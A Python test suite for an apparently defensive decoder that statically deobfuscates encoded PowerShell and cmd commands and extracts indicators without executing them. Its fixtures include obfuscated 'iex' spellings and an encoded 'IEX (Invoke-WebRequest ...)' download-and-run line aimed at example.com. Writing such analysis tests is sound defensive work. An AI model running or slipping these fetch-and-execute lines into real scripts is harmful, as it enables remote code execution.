import base64
import gzip
import json
import zlib
from copy import deepcopy

import pytest
from services.decoder.automatic import analyze, replay_recipe, MAX_INPUT, MAX_OUTPUT
from services.decoder.base.compression import inflate_bounded
from services.decoder.base.base64_codec import decode_base64_candidate
from services.decoder.engine import UniversalDecoderEngine

SCRIPT = 'Write-Output "hello"'
def b64(value):
    return base64.b64encode(value).decode()
def final(text):
    return analyze(text)['final_recoverable']['value']

@pytest.mark.parametrize('encoding', ['utf-8', 'utf-16-le', 'utf-16-be'])
def test_text_encodings(encoding):
    assert final(b64(SCRIPT.encode(encoding))) == SCRIPT

@pytest.mark.parametrize('compress', [gzip.compress, zlib.compress])
def test_nested_binary_layers_and_replay(compress):
    value = b64(compress(b64(SCRIPT.encode('utf-16le')).encode()))
    result = analyze(value)
    assert result['decode_status'] == 'RECOVERED'
    assert result['canonical_decoded_artifact']['text'] == SCRIPT
    for candidate in result['candidates']:
        assert replay_recipe(value, candidate['recipe']) == candidate['payload']
        previous = None
        for step in candidate['layers']:
            if previous: assert previous == step['input_sha256']
            assert step['provenance']['decoded_from'] == 'sha256:' + step['input_sha256']
            assert step['provenance']['execution'] is False
            previous = step['output_sha256']


def test_original_exact_and_powershell_semantics():
    raw = ' \tpowershell -EncodedCommand "' + b64(SCRIPT.encode('utf-16le')) + '" \r\n'
    result = UniversalDecoderEngine().analyze_automatic(raw)
    assert result['original_command'] == raw
    assert result['canonical_decoded_artifact']['text'] == SCRIPT
    assert [p['stage'] for p in result['candidates'][0]['layers']] == ['extract.encodedcommand', 'base64', 'utf-16-le']


def test_encodedcommand_does_not_guess_utf8():
    r = analyze('powershell -enc ' + b64(SCRIPT.encode()))
    assert not r['canonical_decoded_artifact']['promoted']


def test_short_nested_base64_regression():
    assert final(b64(b64(SCRIPT.encode()).encode())) == SCRIPT


def test_multiple_embedded_are_automatic_but_not_one_canonical():
    raw = '; '.join("[Convert]::FromBase64String('"+b64(s.encode())+"')" for s in (SCRIPT, 'Write-Output "two"'))
    result = analyze(raw)
    assert result['needs_choice'] is False
    assert {c['payload']['value'] for c in result['candidates']} == {SCRIPT, 'Write-Output "two"'}
    assert result['decode_status'] == 'AMBIGUOUS'
    assert not result['canonical_decoded_artifact']['promoted']


@pytest.mark.parametrize('raw,expected', [
    ("('Write-' + ('Out' + 'put'))", "'Write-Output'"),
    ('[char]105+[char]101+[char]120', "'iex'"),
    ('[char]0x69+[char]0x65+[char]0x78', "'iex'"),
    ('cmd /c ec^ho hello', 'echo hello'),
    ("'{1}{0}' -f 'ex','i'", "'iex'"),
    ("('i','e','x') -join ''", "'iex'"),
    ('%57%72%69%74%65%2d%4f%75%74%70%75%74%20%22%68%65%6c%6c%6f%22', SCRIPT),
    (r'\u0057\u0072\u0069\u0074\u0065\u002d\u004f\u0075\u0074\u0070\u0075\u0074\u0020\u0022\u0068\u0065\u006c\u006c\u006f\u0022', SCRIPT),
    (SCRIPT.encode().hex(), SCRIPT),
])
def test_static_transformations(raw, expected):
    assert final(raw) == expected


@pytest.mark.parametrize('raw', ["'a' + 1 + 'b'", '"$env:USER" + "x"', "'it''s' + 'literal'", "Write-Output \"'a'+'b'\"", "# 'a' + 'b'", "cmd /c echo %SECRET%", "$a = Get-Content file; IEX $a"])
def test_no_unsafe_literal_or_environment_invention(raw):
    r = analyze(raw)
    assert r['final_recoverable']['value'] == raw
    assert not r['canonical_decoded_artifact']['promoted']


def test_nested_literal_in_frombase64():
    val = b64(SCRIPT.encode())
    raw = "[Convert]::FromBase64String('"+val[:8]+"'+'"+val[8:]+"')"
    r = analyze(raw)
    assert r['final_recoverable']['value'] == SCRIPT
    assert r['decode_status'] == 'PARTIALLY_RECOVERED'  # wrapper not proven


def test_cryptography_is_not_guessed():
    r = analyze("AES decrypt $ciphertext with $key")
    assert not r['canonical_decoded_artifact']['promoted']
    assert r['decode_status'] == 'UNRECOVERED'


def test_decompression_bomb():
    bomb = gzip.compress(b'A' * (MAX_OUTPUT * 10))
    with pytest.raises(ValueError, match='limit'):
        inflate_bounded(bomb, max_output=MAX_OUTPUT)
    r = analyze(b64(bomb))
    assert r['decode_status'] == 'PARTIALLY_RECOVERED'
    assert not r['canonical_decoded_artifact']['promoted']
    assert any('limit' in reason for c in r['candidates'] for reason in c['unresolved'])


def test_truncated_compression_retains_partial_prefix():
    r = analyze(b64(gzip.compress(SCRIPT.encode())[:-5]))
    assert r['final_recoverable']['value'] == SCRIPT
    assert r['decode_status'] == 'PARTIALLY_RECOVERED'
    assert not r['canonical_decoded_artifact']['promoted']


def test_bad_crc_not_silently_recovered():
    raw = bytearray(gzip.compress(SCRIPT.encode())); raw[-8] ^= 1
    assert not analyze(b64(raw))['canonical_decoded_artifact']['promoted']


def test_multimember_not_silently_complete():
    r = analyze(b64(gzip.compress(SCRIPT.encode()) + gzip.compress(b'second')))
    assert r['decode_status'] == 'PARTIALLY_RECOVERED'


@pytest.mark.parametrize('value', ['', ' '*12, 'é'*(MAX_INPUT//2+1)])
def test_input_limits(value):
    with pytest.raises(ValueError): analyze(value)


@pytest.mark.parametrize('value', ['a===', 'AAAAA', 'AB==', 'AAA===', 'AAA=', 'abcd=='])
def test_base64_roundtrip_validation(value):
    result = decode_base64_candidate(value)
    if value == 'AAA=': assert result == b'\0\0'
    else: assert result is None


def test_urlsafe():
    raw = 'Write-Output "~?😀"'.encode()
    encoded = base64.urlsafe_b64encode(raw).decode().rstrip('=')
    assert final(encoded) == raw.decode()


def test_depth_budget():
    value = SCRIPT.encode()
    for _ in range(10): value = base64.b64encode(value)
    r = analyze(value.decode())
    assert r['decode_status'] == 'PARTIALLY_RECOVERED'
    assert not r['canonical_decoded_artifact']['promoted']


def test_branch_budget(monkeypatch):
    from services.decoder import automatic
    monkeypatch.setattr(automatic, 'MAX_NODES', 3)
    r = analyze(b64(b64(SCRIPT.encode()).encode()))
    assert r['warnings']
    assert not r['canonical_decoded_artifact']['promoted']


def test_recipe_tampering():
    value = b64(SCRIPT.encode()); recipe = deepcopy(analyze(value)['candidates'][0]['recipe'])
    recipe[0]['output_sha256'] = 'bad'
    with pytest.raises(ValueError): replay_recipe(value, recipe)


def test_evidence_iocs_and_hold():
    value = b64(b'IEX (Invoke-WebRequest https://example.com/sample.ps1)')
    r = analyze(value)
    assert any(i['type']=='urls' and i['value']=='https://example.com/sample.ps1' for i in r['iocs'])
    assert any(i['type']=='domains' and i['value']=='example.com' for i in r['iocs'])
    assert all(i['evidence_id'].startswith('sha256:') for i in r['iocs'])
    assert all(b['evidence_id'].startswith('sha256:') for b in r['behaviors'])
    assert r['mitre'] == []
    assert r['execution'] is False


def test_deterministic():
    value = b64(gzip.compress(SCRIPT.encode(), mtime=0))
    left, right = analyze(value), analyze(value)
    for result in (left, right):
        for candidate in result['candidates']:
            for step in candidate['layers']:
                assert step['provenance'].pop('recorded_at')
    assert left == right
